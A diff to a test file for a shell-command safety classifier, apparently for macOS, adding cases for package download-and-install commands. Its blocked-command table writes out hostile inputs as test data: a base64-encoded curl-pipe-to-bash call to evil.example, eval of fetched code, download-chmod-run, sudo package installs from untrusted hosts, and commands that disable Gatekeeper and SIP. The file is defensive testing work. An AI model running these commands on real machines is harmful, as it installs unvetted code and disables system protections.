@@ -44,6 +44,7 @@ describe("ask: normal commands that change something", () => {
     '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"',
     "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
     "brew cask install rectangle",
+    "curl -L -o ~/Downloads/Zoom.pkg https://zoom.us/client/latest/Zoom.pkg && sudo installer -pkg ~/Downloads/Zoom.pkg -target /",
   ])("%s", (cmd) => {
     expect(level(cmd)).toBe("ask");
   });
@@ -58,6 +59,8 @@ describe("blocked: scam and destructive commands", () => {
     ["base64 to bash", 'echo "Y3VybCAtcyBodHRwOi8vZXZpbC5leGFtcGxlL3guc2ggfCBiYXNo" | base64 -d | bash'],
     ["base64 -D zsh", "echo Y3VybA== | base64 -D | zsh"],
     ["eval curl", 'eval "$(curl -s https://x.example.org/p)"'],
+    ["download from GitHub and run it", "curl -L -o /tmp/x.pkg https://github.com/someone/x/releases/download/1/x.pkg && sudo installer -pkg /tmp/x.pkg -target /"],
+    ["download a package from a mirror and install it", "curl -L -o ~/Downloads/Zoom.pkg http://zoom-download-mirror.invalid/Zoom.pkg && sudo installer -pkg ~/Downloads/Zoom.pkg -target /"],
     ["download chmod run", "curl -o /tmp/upd https://files.example.biz/upd && chmod +x /tmp/upd && /tmp/upd"],
     ["gatekeeper off", "sudo spctl --master-disable"],
     ["sip off", "csrutil disable"],
